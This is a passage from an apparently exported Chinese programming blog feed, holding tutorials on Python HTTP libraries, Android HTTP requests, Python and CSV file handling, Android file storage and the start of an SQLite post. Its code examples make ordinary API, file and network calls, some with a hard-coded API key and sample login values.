#此处添加自己的百度API Stroe的APIKEYresp = urllib2.urlopen(req)print resp.read() 12运行结果如下：&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125; httplib2模块安装httplib2模块httplib2是一个全面的HTTP客户端库，它也是一个第三方开源库，所以需要自行安装。 1pip install httplib2 带参数和Header的GET请求12345678# -*- coding:utf-8 -*-import httplib2 h = httplib2.Http() url = &apos;http://apis.baidu.com/jidichong/school_search/school_search/?name=清华大学&apos; #带请求参数的urlheaders = &#123;&apos;apikey&apos;: &apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;resp, content = h.request (url,&apos;GET&apos;, None , headers) #使用GET方法时，这里的Body参数必须写成None# print respprint content httplib2 Http对象的request()方法返回两个值： 第一个是httplib2.Response对象，其中包含了服务器返回的所有http头。比如, status为200 表示请求成功。 第二个返回值包含了http服务器返回的实际数据。数据以bytes对象返回，不是字符串。 如果你需要一个字符串，你需要确定字符编码并自己进行转换 12程序运行结果：&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125; 带参数和Header的POST请求1234567891011# -*- coding:utf-8 -*-import httplib2 from urllib import urlencodeh = httplib2.Http() url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;data = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125; headers = &#123;&apos;apikey&apos;: &apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;,&apos;Content-type&apos;: &apos;application/x-www-form-urlencoded&apos;&#125;# 必须带上headers参数，否则POST不成功resp, content = h.request(url,&apos;POST&apos;,urlencode(data),headers) # print resp print content 1程序运行结果同上GET方法 requests模块requests是第三方库，它使用的是urllib3，继承了urllib2的所有特性。Requests支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的URL和POST数据自动编码。同时，它支持Http协议的GET、POST、PUT、DELETE等多种请求方式。 安装1pip install requests 简单GET请求12345678910# -*- coding:utf-8 -*-import requestsimport sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) #设置文件的编码方式req = requests.get(url=&apos;http://blog.line-coding.tech&apos;) print req.urlprint req.status_code print req.text 1234程序运行结果：http://blog.line-coding.tech/200篇幅有限，此处省去网页源代码 带参数和Header的GET请求如果你想为请求添加HTTP头部，只要简单地传递一个dict给headers参数就可以了。 1234567891011# -*- coding:utf-8 -*-import requestsimport sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) #设置文件的编码方式url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;headers = &#123;&apos;apikey&apos;:&apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;params = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125;rep = requests.get(url, params = params, headers = headers)print rep.text 12程序运行结果：&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125; 带参数和Header的POST请求1234567891011# -*- coding:utf-8 -*-import requestsimport sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) #设置文件的编码方式url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;headers = &#123;&apos;apikey&apos;:&apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;data = &#123;&apos;name&apos;: &apos;清华大学&apos;&#125;r = requests.post(url , data = data, headers = headers )print r.text 12程序运行结果同上带参数和Header的GET请求，注意这是因为这个接口能够接收GET和POST两种方式的请求，如果你使用的接口有规定只使用GET方法，那还是按规定来吧，要不然请求肯定失败。 POST发送JSON数据由于没有找到合适的可以接收JSON数据的API来做这个测试，所以这里摘抄了别人的一段代码，貌似这个接口也不能用了，悲剧啊。不过，反正就是使用json.dumps将dict转换成json格式的数据之后添加到post的参数中然后再发送post请求就对了。 12345678# -*- coding:utf-8 -*-import requestsimport jsonurl = &apos;https://api.github.com/some/endpoint&apos;payload = &#123;&apos;some&apos;: &apos;data&apos;&#125;r = requests.post(url, data = json.dumps(payload))print r.text 貌似这个接口也不能用了，待博主找到一个更好的API接口再来更新吧，先写到这里了。说实话，总结了四个网络请求模块，把我自己都搞晕了，但是最后也还是弄清楚了，可能放在一起来看有点容易搞混，但是有对比才有知道自己应该用哪个啊。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Http网络请求]]></title>
    <url>%2F2016%2F08%2F05%2FAndroid-Http%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[Android网络编程（特别是Http请求）是Android学习中比较重要的内容，也是Android开发中比较常用的内。虽然已经有很多优秀的第三方开源框架供我们使用，也大大提升了我们的开发效率，但是也因此我们对基本Http请求的并不熟悉，我们应该重视基础，从底层去了解网络请求的实现机制。此篇博客总结了Android两种基本的网络请求方式，并通过一个简单的Demo进行实践。 Android网络编程注意事项 安卓的耗时操作（如I/O流操作）的逻辑不能写在主线程，必须写在子线程。 子线程在安卓2.3以后不能更新UI界面（更新就报错），子线程想要更新界面必须结合Handler或者AsyncTask等才可以。 Android网络操作均需添加网络访问权限： 1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 说明事项以下代码中的GET请求都是对博主博客的一个404页面发送的请求，会返回该页面的html代码，POST请求都是对博主服务器上的一个用户注册API接口发送的请求，其中请求参数包括用户名和密码，如果服务器中的数据库已经存在此账号则会返回一个exist，如果注册成功则会返回一个success，否则返回一个error。 使用HttpURLConnection访问网络HttpURLConnection类位于java.net包中，用于发送HTTP请求和获取HTTP响应。该类是抽象类，不能直接实例化，要使用URL的openConnection()方法获得。 发送GET请求1234567891011121314151617181920public void get() &#123; try &#123; URL url = new URL(&quot;http://blog.line-coding.tech/&quot;); HttpURLConnection huc = (HttpURLConnection) url.openConnection(); // mUrlConnection.setRequestMethod(&quot;GET&quot;); //默认就是GET方式，此声明可不要 //获取字节流，并将字节流转换成字符流 InputStreamReader isr = new InputStreamReader(huc.getInputStream()); //缓冲字符流，以便读取 BufferedReader br = new BufferedReader(isr); String inputLine = null; //按行读取数据 while ((inputLine = br.readLine()) != null) &#123; result += inputLine + &quot;\n&quot;; &#125; isr.close(); //关闭输入流 huc.disconnect(); //关闭连接 &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;&#125; GET方法在传递中文参数时，会产生乱码，要进行Base64编码来解决乱码问题。 12345678910public String base64Encode(String params) &#123; try &#123; params = Base64.encodeToString(params.getBytes(&quot;utf-8&quot;), Base64.DEFAULT); params = URLEncoder.encode(params,&quot;utf-8&quot;); &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return params;&#125; 发送POST请求12345678910111213141516171819202122232425262728293031public void post() &#123; try &#123; URL url = new URL(&quot;http://data.line-coding.tech/register.php&quot;); HttpURLConnection huc = (HttpURLConnection) url.openConnection(); huc.setRequestMethod(&quot;POST&quot;); huc.setDoInput(true); // 向连接中写入数据 huc.setDoOutput(true); // 向连接中读取数据 huc.setUseCaches(false); // 禁止缓存 huc.setInstanceFollowRedirects(true); // 自动执行Http重定向 huc.setRequestProperty(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;); //设置内容类型 DataOutputStream dos = new DataOutputStream(huc.getOutputStream()); //获取输出流 String params = &quot;username=13674852343&quot; + &quot;&amp;password=123456&quot;; //添加请求参数 dos.writeBytes(params); //将数据写入到输出流 dos.flush(); //输出缓存 dos.close(); //关闭输出流 if (huc.getResponseCode() == HttpURLConnection.HTTP_OK) &#123; InputStreamReader isr = new InputStreamReader( huc.getInputStream()); BufferedReader br = new BufferedReader(isr); String inputLine = null; while ((inputLine = br.readLine()) != null) &#123; result += inputLine + &quot;\n&quot;; &#125; isr.close(); &#125; huc.disconnect(); //关闭连接 &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;&#125; 使用HttpClient访问网络对于比较复杂的联网操作，使用HttpUrlConnection就不一定能够满足要求，此时，可以使用Apache组织提供的HttpClient项目来实现。HttpClient中将HttpUrlConnection类中的输入/输出流操作统一封装成HttpGet、HttpPost和HttpResponse类。其中HttpGet类代表发送GET请求、HttpPost代表发送POST请求、HttpResponse类代表处理响应的对象。 发送GET请求使用流程（1）创建HttpClient对象 （2）创建HttpGet对象 （3）如需添加参数，可以在url中添加参数，也可调用HttpGet的setParams()方法来添加请求参数。 （4）调用HttpClient对象的execute()方法发送请求。 （5）调用HttpResponse的getEntity()方法获得包含服务器响应内容的HttpEntity对象。 使用示例1234567891011121314151617181920public void getMethod() &#123; String url = &quot;http://blog.line-coding.tech/&quot;; try &#123; HttpClient client = new DefaultHttpClient(); //创建HttpClient对象 HttpGet get = new HttpGet(url); //创建HttpGet对象 HttpResponse response = client.execute(get); //执行HttpClient请求 if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) &#123; result = EntityUtils.toString(response.getEntity()); //获取返回结果 &#125; else &#123; result = &quot;请求失败&quot;; &#125; &#125; catch (ClientProtocolException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;&#125; 发送POST请求使用流程（1）创建HttpClient对象 （2）创建HttpGet对象 （3）调用HttpPost的setParams()方法来添加请求参数，也可调用setEntity()方法来设置请求参数。 （4）调用HttpClient对象的execute()方法发送请求。 （5）调用HttpResponse的getEntity()方法获得包含服务器响应内容的HttpEntity对象。 使用示例：123456789101112131415161718192021222324252627public void postMethod() &#123; String url = &quot;http://data.line-coding.tech/register.php&quot;; HttpClient client = new DefaultHttpClient(); //创建HttpClient对象 HttpPost post = new HttpPost(url); //创建HttpGet对象 List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;(); params.add(new BasicNameValuePair(&quot;username&quot;, &quot;13674852343&quot;)); params.add(new BasicNameValuePair(&quot;password&quot;, &quot;123456&quot;)); try &#123; post.setEntity(new UrlEncodedFormEntity(params,&quot;utf-8&quot;)); //添加参数 HttpResponse response = client.execute(post); //执行HttpClient请求 if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) &#123; //判断请求是否成功 result = EntityUtils.toString(response.getEntity()); //获取返回结果 &#125; else &#123; result = &quot;请求失败&quot;; &#125; &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (ClientProtocolException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;; &#125; 简单的Demo通过在MainActivity中使用子线程分别调用以上四个方法来发送Http请求，并通过Handler在子线程和主线程之间传递消息，通知主线程更新UI，以此来测试所写的方法是否可行。 1234567891011121314151617181920212223242526272829303132private TextView mTextView;private String result = &quot;&quot;;private Handler mHandler = new Handler() &#123; public void handleMessage(Message msg) &#123; if (result != null) &#123; mTextView.setText(result); //收到通知，则将Http请求的结果显示在界面上 &#125; &#125;;&#125;;@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mTextView = (TextView) findViewById(R.id.tv_result); new Thread(new Runnable() &#123; //开启子线程来执行网络请求 @Override public void run() &#123; // TODO Auto-generated method stub get(); //使用HttpURLConnection的GET方法 //post(); //使用HttpURLConnection的POST方法 //getMethod(); //使用HttpClient的GET方法 //postMethod(); //使用HttpClient的POST方法 Message msg = mHandler.obtainMessage(); //获取一个Message对象 mHandler.sendMessage(msg); //通知UI进行更新 &#125; &#125;).start();&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Http］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python文件操作]]></title>
    <url>%2F2016%2F08%2F03%2FPython%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[上一篇博文中我们介绍了Python使用Mysql数据库进行数据存储，数据库存储的数据需要特定的工具进行打开，而普通的数据文件是一般的电脑都能打开进行查看的，因此数据库存储的通用性没有文件存储那么好，文件存储也是Python网络爬虫的常用存储方式之一，特别是csv文件，所以我们对于文件的输入输出流操作、缓存、基本的读写方式、文件迭代器等我们都需要有一些基本的了解，并熟练掌握文件的读写操作，为我们的爬虫实战打下坚实的基础。 打开文件打开文件使用open函数，其中文件名是必选参数，文件模式和缓冲是可选参数 1open(name[,mode[,buffering]]) 参数1：文件名文件名一般采用绝对路径，其中会包含\字符，所以可在字符串前加r。 ‘r’是防止字符转义的，如果路径中出现’\t’的话，不加r的话\t就会被转义 而加了’r’之后’\t’就能保留原有的样子。例如： 123456&gt;&gt;&gt; s = &apos;C:\Python27\tcl&apos;&gt;&gt;&gt; print sC:\Python27 cl #解释器将\t识别成一个制表符的间隔&gt;&gt;&gt; s = r&apos;C:\Python27\tcl&apos;&gt;&gt;&gt; print sC:\Python27\tcl #不进行转义，正常输出 可见在字符串前加’r’才能正确使用文件路径 参数2：文件模式 值 描述 值 描述 ‘r’ 读模式 ‘a’ 追加模式 ‘w’ 写模式 ‘b’ 二进制模式 ‘+’ 读/写模式 参数3：缓冲参数是0或者False，输入输出是无缓冲的 参数是1或者True，输入输出是有缓冲的 文件读写写入数据（1）以字符串形式写入 1234567#以写模式打开py.txt文件，若文件不存在，则会创建，若存在则覆盖文件原来的内容f = open(r&apos;D:\Python\py.txt&apos;,&apos;w&apos;)#写入Python之禅的前两句f.write(&apos;Beautiful is better than ugly.\n&apos;)f.write(&apos;Explicit is better than implicit.\n&apos;) f.flush()f.close() 成功写入之后，txt文件内容为以下两行： Beautiful is better than ugly. Explicit is better than implicit. （2）写入行 writelines()将传递进来的一个字符串列表中的所有的字符串写入文件，但是不会增加新行，需要自己手动添加。 123456#采用追加模式，再向py.txt文件写入Python之禅的三四句f = open(r&apos;D:\Python\py.txt&apos;,&apos;a&apos;)content = [&apos;Simple is better than complex.\n&apos;,&apos;Complex is better than complicated.\n&apos;]f.writelines(content) f.flush()f.close() 成功写入之后，txt文件内容为以下四行： Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. 读取数据（1）以字符串形式读取1234f = open(r&apos;D:\Python\py.txt&apos;,&apos;r&apos;)print f.read(6) #读取6个字符print f.read() #读取整个文件f.close() 运行结果如下： Beauti ful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. 可以看出，f.read(6)先读出了6个字符，然后f.read()将其余的内容全部读出来了。 （2）读取行 123f = open(r&apos;D:\Python\py.txt&apos;,&apos;r&apos;)print f.readline() #读取一行数据f.close() readline()函数，读取一行，运行结果如下： Beautiful is better than ugly. 123f = open(r&apos;D:\Python\py.txt&apos;,&apos;r&apos;)print f.readlines() #读取文件的所有行f.close() readlines()函数，读取一个文件的所有行，并将其作为列表返回，运行结果如下： [&apos;Beautiful is better than ugly.\n&apos;, &apos;Explicit is better than implicit.\n&apos;, &apos;Simple is better than complex.\n&apos;, &apos;Complex is better than complicated.\n&apos;] 对文件内容进行迭代按字节处理1234567filename = r&apos;D:\Python\py.txt&apos;f = open(filename)while True: char = f.read(1) #每次读取一个字符 if not char: break #没有字符可读了则停止 print char #打印字符f.close() 按行处理1234567filename = r&apos;D:\Python\py.txt&apos;f = open(filename)while True: line = f.readline().strip() #读取一行，并去除空行 if not line: break #如果没有下一行了则停止 print line #打印读取到的一行f.close() 程序运行结果如下： Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. 使用fileinput实现懒惰行迭代1234import fileinputfilename = r&apos;D:\Python\py.txt&apos;for line in fileinput.input(filename): print line.strip() #打印读取到的行，并去除空行 程序运行结果同2 文件迭代器12345filename = r&apos;D:\Python\py.txt&apos;f = open(filename)for line in f: print line.strip() #打印读取到的行，并去除空行f.close() 程序运行结果同2 关闭文件写入过的文件总应该关闭，因为Python可能会缓存写入的数据，如果程序奔溃了，那么数据就不会被写入到文件，为了安全起见，在使用完文件后要进行关闭操作。 12345#打开文件try: #写入数据finally: file.close() csv文件处理逗号分隔值（Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。csv文件经常用于网络数据爬取的数据存储。csv文件可以用记事本和excel打开进行查看。 123456789101112131415161718192021# -*- coding: utf-8 -*-import csvcsvFile = open(&quot;D:/Python/data.csv&quot;,&apos;wb+&apos; )try: writer = csv.writer(csvFile) writer.writerow((&apos;Id&apos;,&apos;Name&apos;,&apos;Age&apos;)) #写入一行数据做列名 data = [(20160001,&apos;fzy&apos;,&apos;21&apos;),(20160002,&apos;lyj&apos;,&apos;21&apos;),(20160003,&apos;ljj&apos;,&apos;20&apos;)] writer.writerows(data) #写入多行 writer.writerow((20160004,&apos;cyx&apos;,&apos;24&apos;)) #写入一行数据finally: csvFile.close()csvFile = open(&quot;D:/Python/data.csv&quot;,&apos;rb+&apos; )try: reader = csv.reader(csvFile) for line in reader: print linefinally: csvFile.close() 程序运行结果： [&apos;Id&apos;, &apos;Name&apos;, &apos;Age&apos;] [&apos;20160001&apos;, &apos;fzy&apos;, &apos;21&apos;] [&apos;20160002&apos;, &apos;lyj&apos;, &apos;21&apos;] [&apos;20160003&apos;, &apos;ljj&apos;, &apos;20&apos;] [&apos;20160004&apos;, &apos;cyx&apos;, &apos;24&apos;]]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android数据存储之文件存储]]></title>
    <url>%2F2016%2F07%2F29%2FAndroid%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%2F</url>
    <content type="text"><![CDATA[前面两篇博客分别介绍了Android的SharedPreferences数据存储和SQLite数据库存储，此篇博客介绍Android数据存储的第三种方式：文件存储，这也是我们平时最为常用的，他的很多操作与Java文件操作基本一致，只是因为Android是基于Linux操作系统，所以需要对于文件目录结构需要有更深入的理解。 Android内部存储与外部存储Android本身基于Linux操作系统，所以它的内部存储空间，对于应用程序和用户来讲就是“/data/data”目录。它与其他的（外部存储）相比有着存储方便，操作简单，更加稳定、安全等优点。但是它比较有限，比较可贵。 内部存储（internal storage）内部存储不是内存。内部存储位于系统中很特殊的一个位置，如果你想将文件存储于内部存储中，那么文件默认只能被你的应用访问到，且一个应用所创建的所有文件都在和应用包名相同的目录下。也就是说应用创建于内部存储的文件，与这个应用是关联起来的。当一个应用卸载之后，内部存储中的这些文件也被删除。 内部存储空间十分有限，因而显得可贵，另外，它也是系统本身和系统应用程序主要的数据存储所在地，一旦内部存储空间耗尽，手机也就无法使用了。所以对于内部存储空间，我们要尽量避免使用。 内部存储目录/data/data/包名/ 说明 /data/data/包名/shared_prefs sharedpreferrence文件存放目录 /data/data/包名/databases 数据库文件存放目录 /data/data/包名/files 应用程序默认的数据存储目录 /data/data/包名/cache 应用程序默认的缓存文件存放目录 外部存储（external storage）外部存储一般就是storage文件夹或者mnt文件夹，在storage文件夹中有一个sdcard文件夹，这个文件夹中的文件又分为两类，一类是公有目录，还有一类是私有目录 由于内部存储空间有限，在开发中我们一般都是操作外部存储空间，Google官方建议我们App的数据应该存储在外部存储的私有目录中该App的包名下，这样当用户卸载掉App之后，相关的数据会一并删除，如果你直接在/storage/sdcard目录下创建了一个应用的文件夹，那么当你删除应用的时候，这个文件夹就不会被删除。 外部存储目录storage/sdcard，它又分为公有目录和私有目录，其中的公有目录有九大类，比如DCIM、DOWNLOAD等这种系统为我们创建的文件夹，私有目录就是Android这个文件夹，这个文件夹打开之后里边有一个data文件夹，打开这个data文件夹，里边有许多包名组成的文件夹。 注：所有的这些目录结构都可以通过打开Android模拟器，然后使用DDMS中的File Explorer进行查看。 res/raw和assetsres/raw和assets的相同点两者目录下的文件在打包后会原封不动的保存在apk包中，不会被编译成二进制。 res/raw和assets的不同点（1）res/raw中的文件会被映射到R.java文件中，访问的时候直接使用资源ID即R.id.filename；assets文件夹下的文件不会被映射到R.java中，访问的时候需要AssetManager类。 （2）res/raw不可以有目录结构，而assets则可以有目录结构，也就是assets目录下可以再建立文件夹 另外： assets：用于存放需要打包到应用程序的静态文件，以便部署到设备中。与res/raw不同点在于，ASSETS支持任意深度的子目录。这些文件不会生成任何资源ID，必须使用/assets开始（不包含它）的相对路径名。 res:用于存放应用程序的资源（如图标、GUI布局等），将被打包到编译后的Java中。不支持深度子目录 res/raw:存放通用的文件， 该文件夹内的文件将不会被编译成二进制文件，按原样复制到设备上。 文件存储操作读写/data/data/&lt;应用程序名&gt;/files/目录上的文件（1）文件权限 MODE_PRIVATE-默认操作模式，代表该文件是私有数据，只能被应用本身访问，在该模式下，写入的内容会覆盖原文件的内容。 MODE_APPEND-该模式会检查文件是否存在，存在就往文件追加内容，否则就创建新文件。 MODE_WORLD_READABLE和MODE_WORLD_WRITEABLE-用来控制其他应用程序是否有权限读写该文件。 （2）读文件 1234567891011121314public String readFile(String fileName) throws IOException &#123; String res = &quot;&quot;; try &#123; FileInputStream fis = openFileInput(fileName); int length = fis.available(); byte[] bytes = new byte[length]; fis.read(bytes); res = EncodingUtils.getString(bytes, &quot;UTF-8&quot;); fis.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return res;&#125; （3）写文件12345678910public void writeFile(String fileName, String str) throws IOException &#123; try &#123; FileOutputStream fos = openFileOutput(fileName, MODE_PRIVATE); byte[] bytes = str.getBytes(); fos.write(bytes); fos.close(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; 读写SD卡中的文件。也就是/storage/sdcard/目录下面的文件目录/mnt/sdcard和目录/sdcard没有区别，它们都是指向目录/storage/sdcard的快捷方式。 （1）添加权限 1234&lt;!-- SDCard中创建与删除文件权限 --&gt; &lt;uses-permission android:name=&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;/&gt; &lt;!-- 向SDCard写入数据权限 --&gt; &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt; （2）判断SDCard是否存在1234public boolean isSdCardExist() &#123; return Environment.getExternalStorageState().equals( Environment.MEDIA_MOUNTED); &#125; （3）获取SD卡根目录1234567891011 public File getSdCardPath() &#123; boolean exist = isSdCardExist(); File dir; if (exist) &#123; dir = Environment.getExternalStorageDirectory(); &#125; else &#123; dir = null; &#125; return dir;&#125; （4）写文件 1234567891011121314151617181920public void writeSDCardFile(String fileName, String str) &#123; File myfile = new File(getSdCardPath(), fileName); try &#123; if(!myfile.exists())&#123; //如果文件不存在则创建新文件 myfile.createNewFile(); &#125; FileOutputStream fos = new FileOutputStream(myfile); byte[] bytes = str.getBytes(&quot;UTF-8&quot;); //将字符串转换成字节序列，并制定编码为UTF-8 fos.write(bytes); fos.flush(); //将缓冲区中的数据强制写出 fos.close(); //关闭数据流 &#125; catch (FileNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;&#125; （5）读文件 1234567891011121314151617181920public String readSDCardFile(String fileName) &#123; String res = null; File myfile = new File(getSdCardPath(), fileName); try &#123; FileInputStream fis = new FileInputStream(myfile); int length = fis.available(); //得到数据长度 byte[] bytes = new byte[length]; //开辟一个字节数组 fis.read(bytes); //读出数据 fis.close(); //关闭数据流 res = new String(bytes, &quot;UTF-8&quot;); //将字符数组转换成字符串，指定编码为UTF-8 &#125; catch (FileNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return res;&#125; （6）删除文件 1234public void deleteSDCardFile(String fileName) &#123; File myfile = new File(getSdCardPath(), fileName); myfile.delete();&#125; 除了上面讲到的读文件、写文件、删除文件外，File对象还有创建文件、设置可读可写等方法，具体的可以自己取查看相应的文档。 从res/raw中读取文件数据读取文本文件时需要考虑编码格式的问题。在简体中文Windows操作系统中，ANSI 编码代表 GBK 编码，文本文件保存时默认使用ANSI编码，所以在读取文件获取字符串时要使用GBK进行编码。以下代码以读取txt文件为例。 12345678910111213141516171819public String getRawFile(int resId) &#123; String res = &quot;&quot;; try &#123; // 得到资源中的Raw数据流 InputStream in = getResources().openRawResource(resId); int length = in.available(); byte[] bytes = new byte[length]; // 读取数据 in.read(bytes); // 依test.txt的编码类型选择合适的编码，如果不调整会乱码 res = EncodingUtils.getString(bytes, &quot;GBK&quot;); in.close(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return res;&#125; 从assets中读取文件数据以下代码同样以读取txt文件为例。 1234567891011121314151617public String getAssertFile(String fileName) &#123; String res = null; try &#123; // 得到资源中的asset数据流 InputStream in = getResources().getAssets().open(fileName); int length = in.available(); byte[] bytes = new byte[length]; in.read(bytes); in.close(); res = EncodingUtils.getString(bytes, &quot;GBK&quot;); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return res;&#125; 参考博客： [1] android中的文件操作详解以及内部存储和外部存储 [2] android资源目录—assets与res/raw区别 [3] Android - 文件读写操作 总结]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,文件］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android SQLite基本操作详解]]></title>
    <url>%2F2016%2F07%2F26%2FAndroid-SQLite%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[SQLite 是一个开源的嵌入式关系数据库，实现自包容、零配置、支持事务的SQL数据库引擎。 其特点是高度便携、使用方便、结构紧凑、高效、可靠。之前写过一个简单的Android记事本程序，使用过SQLite数据库，但是并没有真正理解并消化。前段时间认真学习了Mysql数据库的相关知识，对数据库有了更深入的认识，于是，也准备把Android这一块的SQLite数据库好好整理一下。 SQLite支持的数据类型： NULL(空值)、INTEGER(整型值)、REAL(浮点值)、TEXT(字符串值)、BLOB(二进制对象) 数据库创建与管理使用辅助类SQLiteOpenHelper来管理数据库的创建和版本更新，在工程中新建一个类SQLiteUtil用于管理数据库，继承自SQLiteOpenHelper。 必须实现构造方法public DatabaseHelper(Context context, String name, CursorFactory factory, int version) 重写两个抽象方法public void onCreate(SQLiteDatabase db)，方法当数据库第一次被建立的时候被执行，一般把创建表,初始化数据等操作放在这里。 public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)方法，当数据库版本更新时会自动执行。 1234567891011121314151617181920212223242526272829303132333435public class SQLiteUtil extends SQLiteOpenHelper&#123; public static final String TABLE_NAME_STUDENT = &quot;student&quot;; public static final String COLUMN_NAME_ID = &quot;_id&quot;; public static final String COLUMN_NOTE_NO = &quot;Sno&quot;; public static final String COLUMN_NOTE_NAME = &quot;Sname&quot;; public static final String COLUMN_NOTE_AGE = &quot;Sage&quot;; public static final String COLUMN_NOTE_SEX = &quot;Ssex&quot;; public SQLiteUtil(Context context, String name, CursorFactory factory,int version) &#123; super(context, name, factory, version); // TODO Auto-generated constructor stub &#125; @Override public void onCreate(SQLiteDatabase db) &#123; // TODO Auto-generated method stub //在这里创建数据库，后文会用到 